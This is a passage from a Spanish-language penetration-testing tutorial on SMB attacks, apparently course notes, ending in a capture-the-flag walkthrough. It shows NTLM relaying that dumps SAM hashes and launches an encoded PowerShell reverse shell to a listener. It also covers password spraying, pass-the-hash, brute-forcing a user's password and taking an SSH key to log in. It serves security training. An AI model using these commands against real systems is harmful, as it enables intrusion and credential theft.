```

{% endcode %}

El hash NTLMv2 fue descifrado. La contraseña es `P@ssword`. Si no podemos descifrar el hash, potencialmente podemos transmitir el hash capturado a otra máquina usando [impacket-ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) o Responder [MultiRelay.py](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py) . Veamos un ejemplo usando `impacket-ntlmrelayx`.

Primero, debemos configurar SMB `OFF` en nuestro archivo de configuración de respuesta ( `/etc/responder/Responder.conf`).

```shell-session
afsh4ck@kali$ cat /etc/responder/Responder.conf | grep 'SMB ='

SMB = Off
```

Luego ejecutamos `impacket-ntlmrelayx` con la opción `--no-http-server`, `-smb2support` y la máquina de destino con la opción `-t`. Por defecto `impacket-ntlmrelayx` volcará la base de datos SAM, pero podremos ejecutar comandos añadiendo la opción `-c`.

```shell-session
afsh4ck@kali$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

<SNIP>

[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up WCF Server

[*] Servers started, waiting for connections

[*] SMBD-Thread-3: Connection from /ADMINISTRATOR@10.10.110.1 controlled, attacking target smb://10.10.110.146
[*] Authenticating against smb://10.10.110.146 as /ADMINISTRATOR SUCCEED
[*] SMBD-Thread-3: Connection from /ADMINISTRATOR@10.10.110.1 controlled, but there are no more targets left!
[*] SMBD-Thread-5: Connection from /ADMINISTRATOR@10.10.110.1 controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xeb0432b45874953711ad55884094e9d4
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:92512f2605074cfc341a7f16e5fabf08:::
demouser:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
test:1001:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
[*] Done dumping SAM hashes for host: 10.10.110.146
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
```

Podemos crear un reverse shell de PowerShell usando <https://www.revshells.com/> , configurar la dirección IP de nuestra máquina, el puerto y la opción Powershell #3 (Base64).

```shell-session
afsh4ck@kali$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
```

Una vez que la víctima se autentica en nuestro servidor, envenenamos la respuesta y hacemos que ejecute nuestro comando para obtener un shell inverso.

```shell-session
afsh4ck@kali$ nc -lvnp 9001

listening on [any] 9001 ...
connect to [10.10.110.133] from (UNKNOWN) [10.10.110.146] 52471

PS C:\Windows\system32> whoami;hostname

nt authority\system
WIN11BOX
```

## **RPC**

En el módulo [Enumeración](/ethical-hacking-cheatsheet/recopilacion-de-informacion/enumeracion.md) , analizamos cómo enumerar una máquina usando RPC. Además de la enumeración, podemos usar RPC para realizar cambios en el sistema, como por ejemplo:

* Cambiar la contraseña de un usuario.
* Cree un nuevo usuario de dominio.
* Crea una nueva carpeta compartida.

Tenga en cuenta que se requieren algunas configuraciones específicas para permitir este tipo de cambios a través de RPC. Podemos usar la [página de manual de rpclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) o [SMB Access desde Linux Cheat Sheet](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf) del SANS Institute para explorar esto más a fondo.

***

## <mark style="color:purple;">Cheatsheet</mark>

<table data-header-hidden><thead><tr><th width="369"></th><th></th></tr></thead><tbody><tr><td><strong>Comando</strong></td><td><strong>Descripción</strong></td></tr><tr><td><code>smbclient -N -L //10.129.14.128</code></td><td>Pruebas de sesión nula contra el servicio SMB.</td></tr><tr><td><code>smbmap -H 10.129.14.128</code></td><td>Enumeración de recursos compartidos de red mediante <code>smbmap</code></td></tr><tr><td><code>smbmap -H 10.129.14.128 -r notes</code></td><td>Enumeración recursiva de recursos compartidos de red mediante <code>smbmap</code></td></tr><tr><td><code>smbmap -H 10.129.14.128 --download "notes\note.txt"</code></td><td>Descargar un archivo específico de la carpeta compartida</td></tr><tr><td><code>smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"</code></td><td>Subir un archivo específico en la carpeta compartida</td></tr><tr><td><code>rpcclient -U'%' 10.10.110.17</code></td><td>Sesión nula con <code>rpcclient</code></td></tr><tr><td><code>./enum4linux-ng.py 10.10.11.45 -A -C</code></td><td>Enumeración automatizada del servicio SMB mediante <code>enum4linux-ng</code></td></tr><tr><td><code>crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!'</code></td><td>Password Spraying contra diferentes usuarios de una lista.</td></tr><tr><td><code>impacket-psexec administrator:'Password123!'@10.10.110.17</code></td><td>Conectarse al servicio SMB usando <code>impacket-psexec</code></td></tr><tr><td><code>crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec</code></td><td>Ejecutar un comando sobre el servicio SMB usando <code>crackmapexec</code></td></tr><tr><td><code>crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users</code></td><td>Enumeración de usuarios registrados</td></tr><tr><td><code>crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam</code></td><td>Extraiga hashes de la base de datos SAM</td></tr><tr><td><code>crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE</code></td><td>Utilice la técnica Pass-The-Hash para autenticarse en el host de destino</td></tr><tr><td><code>impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146</code></td><td>Volcado de la base de datos SAM usando <code>impacket-ntlmrelayx</code></td></tr><tr><td><code>impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e &#x3C;base64 reverse shell></code></td><td>Ejecutar un reverse shell basado en PowerShell usando <code>impacket-ntlmrelayx</code></td></tr></tbody></table>

***

## <mark style="color:purple;">Caso práctico</mark>

```
Objetivo: 10.129.12.72
Recursos: usernames.list, pws.list
```

### Pregunta 1

> ¿Cuál es el nombre de la carpeta compartida con permisos de LECTURA?

```shell-session
afsh4ck@kali$ crackmapexec smb 10.129.12.72 -u usernames.list -p pws.list

SMB         10.129.12.72    445    ATTCSVC-LINUX    [*] Windows 6.1 Build 0 (name:ATTCSVC-LINUX) (domain:) (signing:False) (SMBv1:False)
SMB         10.129.12.72    445    ATTCSVC-LINUX    [+] \aartjan:liverpool 
```

```shell-session
afsh4ck@kali$ crackmapexec smb 10.129.12.72 -u aartjan -p liverpool --shares

SMB         10.129.12.72    445    ATTCSVC-LINUX    [*] Windows 6.1 Build 0 (name:ATTCSVC-LINUX) (domain:) (signing:False) (SMBv1:False)
SMB         10.129.12.72    445    ATTCSVC-LINUX    [+] \aartjan:liverpool 
SMB         10.129.12.72    445    ATTCSVC-LINUX    [+] Enumerated shares
SMB         10.129.12.72    445    ATTCSVC-LINUX    Share           Permissions     Remark
SMB         10.129.12.72    445    ATTCSVC-LINUX    -----           -----------     ------
SMB         10.129.12.72    445    ATTCSVC-LINUX    print$                          Printer Drivers
SMB         10.129.12.72    445    ATTCSVC-LINUX    GGJ             READ            Priv
SMB         10.129.12.72    445    ATTCSVC-LINUX    IPC$                            IPC Service (attcsvc-linux Samba)
```

La carpeta compartida con permisos de LECTURA es: `GGJ`

```shell-session
afsh4ck@kali$ smbclient -U aartjan \\\\10.129.12.72\\GGJ
Password for [WORKGROUP\aartjan]:

Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Apr 19 23:33:55 2022
  ..                                  D        0  Mon Apr 18 19:08:30 2022
  id_rsa                              N     3381  Tue Apr 19 23:33:04 2022

		14384136 blocks of size 1024. 10079732 blocks available
smb: \> get id_rsa
NT_STATUS_ACCESS_DENIED opening remote file \id_rsa
```

Al acceder con smbclient vemos que hay un `id_rsa` para acceder por SSH, pero que no podemos descargar.

### Pregunta 2

> ¿Cuál es la contraseña del usuario "jason"?

Al ejecutar enum4linux observamos que hay varios usuarios y nos da info relevante sobre el dominio:

<pre class="language-shell-session"><code class="lang-shell-session">afsh4ck@kali$ enum4linux -a 10.129.12.72

=======================( Target Information )========================

Target ........... 10.129.197.206
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

<strong>================( OS information on 10.129.197.206 )==================
</strong>
[+] Got OS info for 10.129.197.206 from srvinfo: 
	ATTCSVC-LINUX  Wk Sv PrQ Unx NT SNT attcsvc-linux Samba
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03

====================( Users on 10.129.197.206 )=======================

index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: jason	Name: 	Desc: 
index: 0x2 RID: 0x3e9 acb: 0x00000010 Account: robin	Name: 	Desc: 

user:[jason] rid:[0x3e8]
user:[robin] rid:[0x3e9]
</code></pre>

Vamos a hacer bruteforce contra el usuario jason utilizando el flag `--local-auth`:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>afsh4ck@kali$ crackmapexec smb 10.129.12.72 -u jason -p pws.list --local-auth
</strong>
SMB         10.129.203.6    445    ATTCSVC-LINUX    [*] Windows 6.1 Build 0 (name:ATTCSVC-LINUX) (domain:ATTCSVC-LINUX) (signing:False) (SMBv1:False)
SMB         10.129.203.6    445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:liverpool STATUS_LOGON_FAILURE 
SMB         10.129.203.6    445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:theman STATUS_LOGON_FAILURE 
SMB         10.129.203.6    445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:bandit STATUS_LOGON_FAILURE 
SMB         10.129.203.6    445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:dolphins STATUS_LOGON_FAILURE 
SMB         10.129.203.6    445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:giants STATUS_LOGON_FAILURE 
SMB         10.129.203.6    445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:jackass STATUS_LOGON_FAILURE 
SMB         10.129.203.6    445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:hotdog STATUS_LOGON_FAILURE 
SMB         10.129.203.6    445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:rosebud STATUS_LOGON_FAILURE 
SMB         10.129.203.6    445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:success STATUS_LOGON_FAILURE 
SMB         10.129.203.6    445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:debbie STATUS_LOGON_FAILURE 
&#x3C;--SNIP-->
SMB         10.129.203.6    445    ATTCSVC-LINUX    [+] ATTCSVC-LINUX\jason:34c8zuNBo91!@28Bszh
</code></pre>

Obtenemos la contraseña del usuario jason: `34c8zuNBo91!@28Bszh` 🏆

### Pregunta 3

> Inicie sesión como usuario "jason" a través de SSH y busque el archivo flag.txt. Envíe el contenido como respuesta.

Como vimos anteriormente, en la carpeta compartida GGJ había un `id_rsa`, pero que no nos podíamos descargar por no tener los permisos necesarios:

```shell-session
afsh4ck@kali$ smbclient -U aartjan \\\\10.129.12.72\\GGJ
Password for [WORKGROUP\aartjan]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Apr 19 23:33:55 2022
  ..                                  D        0  Mon Apr 18 19:08:30 2022
  id_rsa                              N     3381  Tue Apr 19 23:33:04 2022

		14384136 blocks of size 1024. 10079732 blocks available
smb: \> get id_rsa
NT_STATUS_ACCESS_DENIED opening remote file \id_rsa
```

Vamos a intentar acceder con el usuario jason y ver si lo podemos descargar:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>afsh4ck@kali$ smbclient -U jason -W ATTCSVC-LINUX //10.129.12.72/GGJ  
</strong>
Password for [ATTCSVC-LINUX\jason]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Apr 19 23:33:55 2022
  ..                                  D        0  Mon Apr 18 19:08:30 2022
  id_rsa                              N     3381  Tue Apr 19 23:33:04 2022

		14384136 blocks of size 1024. 10087972 blocks available
smb: \> get id_rsa
getting file \id_rsa of size 3381 as id_rsa (17,9 KiloBytes/sec) (average 17,9 KiloBytes/sec)
smb: \> 
</code></pre>

Buum!! Nos conseguimos descargar el id\_rsa, por lo que vamos a poder conectarnos por SSH sin contraseña de la siguiente manera:

```shell-session
afsh4ck@kali$ chmod 400 id_rsa
```

```shell-session
afsh4ck@kali$ ssh -i id_rsa jason@10.129.12.72
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 24 Apr 2024 02:48:49 PM UTC

  System load:  0.0                Processes:               230
  Usage of /:   25.4% of 13.72GB   Users logged in:         0
  Memory usage: 14%                IPv4 address for ens160: 10.129.203.6
  Swap usage:   0%

0 updates can be applied immediately.

Last login: Tue Apr 19 21:50:46 2022 from 10.10.14.20
$ ls
flag.txt
$ cat flag.txt
HTB{SMB_4TT4CKS_2349872359}
```

Conseguido! Hemos accedido correctamente por SSH y hemos obtenido la flag.
